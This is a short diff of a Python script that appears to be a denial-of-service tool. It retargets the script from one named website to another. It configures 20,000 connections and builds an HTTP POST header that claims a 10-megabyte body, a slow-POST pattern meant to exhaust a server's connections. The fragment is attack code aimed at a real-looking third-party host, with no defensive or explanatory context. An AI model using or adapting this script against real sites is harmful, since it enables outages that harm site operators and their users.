@@ -7,14 +7,14 @@ import time
 # ---------------------------
 MAX_CONN = 20000
 PORT = 80
-HOST = "www.ggok.club"
+HOST = "www.ggok.top"
 PAGE = "/index.php"
 # ---------------------------
 
 buf = ("POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Length: 10000000\r\n"
-       "Cookie: dklkt_dos_test\r\n"
+       "Cookie: dos_test\r\n"
        "\r\n" % (PAGE, HOST))
 
 socks = []
